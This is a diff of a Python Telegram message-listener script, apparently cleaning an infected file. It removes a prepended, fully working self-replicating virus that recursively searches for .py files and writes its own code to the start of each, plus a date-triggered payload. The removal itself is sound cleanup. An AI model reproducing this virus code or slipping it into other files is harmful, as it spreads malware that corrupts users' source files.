@@ -1,50 +1,10 @@
-import os
-import datetime
-SIGNATURE = "CRANKLIN PYTHON VIRUS"
-def search(path):
-    filestoinfect = []
-    filelist = os.listdir(path)
-    for fname in filelist:
-        if os.path.isdir(path+"/"+fname):
-            filestoinfect.extend(search(path+"/"+fname))
-        elif fname[-3:] == ".py":
-            infected = False
-            for line in open(path+"/"+fname):
-                if SIGNATURE in line:
-                    infected = True
-                    break
-            if infected == False:
-                filestoinfect.append(path+"/"+fname)
-    return filestoinfect
-def infect(filestoinfect):
-    virus = open(os.path.abspath(__file__))
-    virusstring = ""
-    for i,line in enumerate(virus):
-        if i>=0 and i <39:
-            virusstring += line
-    virus.close
-    for fname in filestoinfect:
-        f = open(fname)
-        temp = f.read()
-        f.close()
-        f = open(fname,"w")
-        f.write(virusstring + temp)
-        f.close()
-def bomb():
-    if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 25:
-        print ("HAPPY BIRTHDAY CRANKLIN!)")
-filestoinfect = search(os.path.abspath(""))
-infect(filestoinfect)
-bomb()
-    
 import configparser
 from telethon import TelegramClient
 from telethon.events import NewMessage
 import asyncio
 import webbrowser
 
-# Define a function to handle incoming messages
-async def handle_new_messages(event: NewMessage.Event):
+async def handle_new_messages(event: NewMessage.Event): #an asynchronous function that handles incoming messages
     message = event.message
     print(f"New message received: '{message.message}'")
 
@@ -60,18 +20,15 @@ async def main():
     config = configparser.ConfigParser()
     config.read("config.ini")
 
-    # Setting configuration values
     api_id = config['Telegram']['api_id']
     api_hash = config['Telegram']['api_hash']
     phone = config['Telegram']['phone']
     username = config['Telegram']['username']
-
-    # Create the client and connect
+    
     client = TelegramClient(username, api_id, api_hash)
     await client.start()
     print("Client Created")
 
-    # Ensure you're authorized
     if not await client.is_user_authorized():
         await client.send_code_request(phone)
         try:
@@ -80,7 +37,7 @@ async def main():
             print(f"Error signing in: {e}")
             return
 
-    # Get entity (chat or channel) to listen to
+# this part takes input for the telegram group that you want to check.
     entity_input = input('Enter entity (Telegram URL or entity id): ')
     try:
         entity = await client.get_entity(entity_input)
